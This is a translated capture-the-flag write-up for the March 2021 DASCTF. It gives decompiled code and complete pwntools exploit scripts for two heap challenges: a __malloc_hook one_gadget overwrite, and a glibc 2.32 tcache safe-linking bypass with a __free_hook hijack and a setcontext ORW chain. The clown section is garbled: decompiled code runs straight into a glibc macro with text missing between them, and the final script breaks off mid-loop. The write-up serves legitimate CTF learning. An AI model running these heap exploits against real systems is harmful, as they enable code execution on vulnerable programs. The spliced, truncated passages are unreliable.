# MAR DASCTF题解
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> 2021 MAR DASCTF题解，包括一道套路pwn题和一道2.32 uaf的pwn题，两个reverse 和
> 四道密码学。题目考察知识点比较新，也能够从中学习到一些新知识。
## Pwn
###  fruitpie
题目的逻辑十分简单
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      size_t size; // [rsp+4h] [rbp-1Ch]
      char *chunk; // [rsp+10h] [rbp-10h]
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      init(*(_QWORD *)&argc, argv, envp);
      welcome();
      puts("Enter the size to malloc:");
      LODWORD(size) = readInt("Enter the size to malloc:");
      chunk = (char *)malloc((unsigned int)size);
      if ( !chunk )
      {
        puts("Malloc Error");
        exit(0);
      }
      printf("%p\n", chunk);
      puts("Offset:");
      _isoc99_scanf("%llx", (char *)&size + 4);
      puts("Data:");
      read(0, &chunk[*(size_t *)((char *)&size + 4)], 0x10uLL);
      malloc(0xA0uLL);
      close(1);
      return 0;
    }
我们可以申请任意大小的一个堆块并得到它的地址，然后往堆块附近写入一个值，之后程序会申请一个0xa0的堆块，最后关闭了标准输出流并返回
那么我们可以申请一个特别大的堆块，这样这个堆块就会靠近libc，我们便可以计算得到libc及地址，进而我们可以向malloc_hook中写入one_gadget，最后通过错误流进行输出
    from pwn import *
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    # r = process("./fruitpie")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    r = remote("54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com",51202)
    libc = ELF("./libc.so.6")
    #gdb.attach(r)
    r.recvuntil("Enter the size to malloc:")
    r.sendline(str(0x200000))
    r.recvuntil("0x")
    chunk_addr = int(r.recvuntil("\n",drop = True),16)
    libc_base = chunk_addr + 0x200ff0
    success("libc_base : " + hex(libc_base))
    malloc_hook = libc_base + libc.sym["__malloc_hook"]
    success("malloc_hook : " + hex(malloc_hook))
    one_gadget = libc_base + 0x10a45c
    offset = hex(malloc_hook - chunk_addr)[2:]
    r.recvuntil("Offset:")
    r.sendline(str(offset))
    r.recvuntil("Data:")
    r.send(p64(one_gadget))
    r.interactive()
    # cat flag >&2
###  clown
程序的主要逻辑如下
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      unsigned int v3; // eax
      sub_D7A();
      sub_D07();
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = get_opt(a1, a2);
          if ( v3 != 2 )
            break;
          Del();
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            Show();
          }
          else
          {
            if ( v3 == 4 )
            {
              puts("Bye~");
              exit(0);
            }
    LABEL_13:
            a1 = (__int64)"Invalid Choice";
            puts("Invalid Choice");
          }
        }
        else
        {
          if ( v3 != 1 )
            goto LABEL_13;
          Add();
        }
      }
    }
程序总体功能是一个比较常见的菜单题，实现了`Add\Delete\Show`功能。其中能申请的堆块数量为`0x100`，也就导致这道题方法还挺灵活的。并且开启了沙箱，那么我们就只能使用
`orw`来获取 `flag`
    int sub_BD5()
    {
      int result; // eax
      unsigned int v1; // [rsp+Ch] [rbp-4h]
      puts("Index: ");
      v1 = get_opt();
      if ( v1 > 12) ^ ((size_t) ptr)))  
    #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
所以，如果后面想通过劫持`tcache`实现任意地址堆块分配，需要知道堆地址，来对我们任意地址进行加密。
这里想要泄露`heap`地址，可以输出`tcache`中的第一个堆块，由于该堆块的`next`指针指向
`tcache_perthread_struct`结构体，所以加密后也就是
`tcache_perthread_struct>>12`，我们很容易得到堆块地址
之后便是劫持`tcache`，劫持`tcache`的最好思路是利用`uaf`漏洞将`tcache`中的空闲堆块的`next`指针改为我们想分配的地址。但是这里没有
`edit`功能。所以选择利用堆合并后，申请大堆块，来实现堆重叠。
先分别释放`0x90 chunk1`和 `0xf0 chunk2`的堆块到`unsortedbin`中造成堆合并，然后再将
`chunk2`放入`tcache`中 。然后申请一个`0x100 chunk3`的堆块，此时`chunk3`就和
`chunk2`发生重叠。利用`chunk3`修改`chunk2`的`next`指针指向`free_hook`
最后便是`orw`，`glibc-2.32`的`orw`，不能仅仅使用`setcontext`，因为此时
`setcontext+61`的参数变为了`rdx`。所以需要找到一个将 `rdi`赋值给`rdx`的`gadget`。我使用如下：
    0x0000000000124990: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
我们只需要再 `rdi+8`处布置`rdi`的值，在`rdx+0x20`处布置 `setcontext+61`的地址，即可实现顺利调用
`setcontext+61`。
后续就是执行 orw来读取 flag
    from pwn import *
    context.update(arch='amd64', os='linux', log_level='debug')
    context.terminal=(['tmux','split','-h'])
    filename = './clown'
    libcname = '/lib/x86_64-linux-gnu/libc.so.6'
    debug = 0
    if debug == 1:
        #p = process([filename], env={"LD_PRELOAD": "./libc-2.31.so"})
        p = process(filename)
        elf = ELF(filename)
        libc = ELF(libcname)
        #libc = ELF('./libc-2.31.so')
    else:
        p = remote('pwn.machine.dasctf.com', 50801)
        libc = ELF('./libc.so.6')
        elf = ELF(filename)
    def Add(size, payload):
        p.sendlineafter('>> ', str(1))
        p.sendlineafter('Size: \n',str(size))
        p.sendafter('Content: ', payload)
    def Delete(idx):
        p.sendlineafter('>> ', str(2))
        p.sendlineafter('Index: \n',str(idx))
    def Show(idx):
        p.sendlineafter('>> ', str(3))
        p.sendlineafter('Index: \n',str(idx))
    def magic_frame(rdx_rdi, secontext_addr, rdi, rsi, rdx, rsp, rip):
        payload = p64(rdx_rdi) + p64(0) * 2  #rdx
        payload += p64(secontext_addr)             #call func_addr
        payload = payload.ljust(0x60, b'\x00')
        payload += p64(rdi) + p64(rsi)  # rdi , rsi
        payload += p64(0) * 2 + p64(rdx) + p64(0x18) + p64(0)  # rdx
        payload += p64(rsp) + p64(rip)  # rsp, rip
        payload = payload.ljust(0xf8, b'\x00')
        return payload
    def enc(addr1, addr2):
        addr = (addr1>>12)^addr2
        return addr
    def Pwn():
        for i in range(8):
            Add(0x90, 'a'*8)
        Add(0xf0, 'a'*8)    #8
        Add(0xa0, 'a'*8)    #9
        #Add(0xf0, 'a'*8)
        for i in range(7):
            Add(0xf0, 'a'*8)    #10-16
        Delete(0)
        Show(0)
        heap_addr = (u64(p.recv(5).ljust(8, b'\x00'))<<12)
        print('heap_addr:',hex(heap_addr))
        for i in range(1, 8):
            Delete(i)
        Add(0x100, 'a'*8)    #17
        Show(7)
        libc_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x10-240-libc.sym['__malloc_hook']
        print('libc_addr:',hex(libc_addr))
        free_hook = libc_addr+libc.sym['__free_hook']
        system = libc_addr+libc.sym['system']
        print("free_hook:",hex(free_hook))
        print('chunk consolidate:')
        for i in range(7):
            Delete(10+i)
        Delete(8)
        for i in range(7):  #18-24
            Add(0xf0, 'a'*8)
        print("double free")
        Delete(20)
        Delete(8)
        #gdb.attach(p, 'bp $rebase(0xf32)')
        print("hajack free_hook")
        a1 = enc(heap_addr+0x7a0, free_hook)
        print("addr:",hex(a1))
        payload = 'a'*0x90+p64(0)+p64(0x91)+p64(a1)
        Add(0x100, payload)  #25
        Add(0xf0, 'a'*8)   #26
        for i in range(8):
            Add(0x80, '2'*8)    #27-34
        for i in range(8):      #35-42
            Add(0xe0, '3'*8)
        for i in range(8):
            Delete(27+i)
        for i in range(7):
            Delete(36+i)
        print("chunk consolidate 2")
        Delete(35)
        for i in range(7):  #43-49